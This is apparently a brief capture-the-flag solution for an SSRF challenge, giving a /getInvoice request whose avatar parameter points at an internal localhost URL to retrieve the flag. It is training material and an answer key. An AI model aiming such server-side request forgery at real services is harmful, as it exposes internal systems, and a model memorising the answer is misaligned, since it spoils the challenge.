## SSRF Challenge
## Download the source code and look into how the invoice is getting generated

## Solution
1. Send the GET request to /getInvoice endpoint with orderId and the avatar url link
2. Hit the below url to retrieve the flag
http://localhost:8080/getInvoice?orderId=1&avatar=http://localhost:8000/img_lights.jpg
